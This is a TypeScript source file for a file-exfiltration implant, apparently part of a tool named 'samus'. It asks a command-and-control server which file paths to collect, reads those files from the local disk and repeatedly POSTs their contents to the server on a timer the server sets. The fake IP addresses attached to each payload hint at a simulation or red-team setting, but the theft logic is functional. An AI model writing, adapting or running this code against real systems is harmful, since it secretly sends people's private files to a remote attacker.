import { faker } from "@faker-js/faker";
import axios from "axios";
import fs from "node:fs";
import chalk from "chalk";
import {c2} from './c2';

const filesToSearchFor = await getFilesToSearchFor()
const payload = await createImportantFilesPayload(filesToSearchFor)

// Send Payload to C2
sendPayload(await payload);

// Send Payload as often as defined by C2
setInterval(async () => {
  sendPayload(await createImportantFilesPayload(filesToSearchFor));
}, c2.pollFrequency);

async function getFilesToSearchFor() : Promise<string[]> {
  const response = await axios.get(`${c2.hostname}/api/tools/samus/important-files`)
  let importantFilePaths = await response.data.importantFilePaths
  console.log(importantFilePaths, 'files to search for!')
  return importantFilePaths
}

// Function to read file contents
async function readFileContent(filePath: string) {
  if (!fs.existsSync(filePath)) {
    console.log("Reading file: ", filePath);
    return null;
  }
  try {
    await fs.promises.access(filePath, fs.constants.F_OK);
    console.log("Reading file: ", filePath);

    const content = await fs.promises.readFile(filePath, "utf-8");
    return { path: filePath, content };
  } catch (error: any) {
    console.log(error);
    if (error.code === "ENOENT") {
      console.warn(`File ${filePath} does not exist. Skipping...`);
      return null;
    } else {
      console.error(`Error reading file ${filePath}:`, error);
      return null;
    }
  }
}

// Function to create payload and send HTTP POST request
async function createImportantFilesPayload(importantFilePaths: string[]): Promise<any> {
  const fileContentsPromises = importantFilePaths.map(readFileContent);
  const fileContents = await Promise.all(fileContentsPromises);

  // Filter out any files that could not be read
  const filePayloads = fileContents.filter ((fileContent) => fileContent !== null).map((fileContent) => {

    // Return a payload
    return {
      path: fileContent?.path,
      content: fileContent?.content,
    };
  })
  let finalPayload: any = {
    ip4: faker.internet.ipv4(),
    ip6: faker.internet.ipv6(),
    files: filePayloads,
  };

//   console.log(finalPayload)
  console.log(chalk.yellowBright("Final Payload Created (above)"));
 
  return finalPayload;
}

function sendPayload(payload: any) {
  console.log('sending payload');
  axios.post(`${c2.hostname}/api/lists/important-files`, payload)
    .then((response) => {
      // console.log(response.data);
      console.log(chalk.blueBright.bold( "[200 - POST] IMPORTANT-FILES"));
    })
    .catch((error) => {
      // console.log(error);
      console.log("Errored important-file post");
    });
}
